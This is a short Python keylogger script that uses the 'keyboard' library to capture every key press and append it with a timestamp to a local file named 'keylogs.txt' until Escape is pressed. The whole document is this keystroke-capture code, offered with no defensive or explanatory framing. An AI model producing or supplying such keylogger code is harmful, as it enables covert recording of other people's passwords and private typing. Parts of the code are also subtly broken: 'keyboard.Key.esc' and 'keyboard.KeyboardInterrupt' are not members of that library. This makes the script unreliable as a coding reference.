```python
import os
import sys
from datetime import datetime
import logging

try:
    import keyboard
except ImportError:
    print("Keyboard library is not installed. Please install using pip by running 'pip install keyboard' in your terminal.")
    sys.exit()

def main():
    log_file = "keylogs.txt"
    
    with open(log_file, "a") as f:
        f.write(f"--- Session started: {datetime.now()} ---\n")
    
    try:
        while True:
            event = keyboard.read_event()
            
            if event.name == keyboard.Key.esc:
                break
            else:
                with open(log_file, "a") as f:
                    f.write(f"{event.name} - {datetime.now()}\n")
    except keyboard.KeyboardInterrupt:
        print("Exiting script.")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        with open(log_file, "a") as f:
            f.write(f"\n--- Session ended: {datetime.now()} ---\n")

if __name__ == "__main__":
    main()
```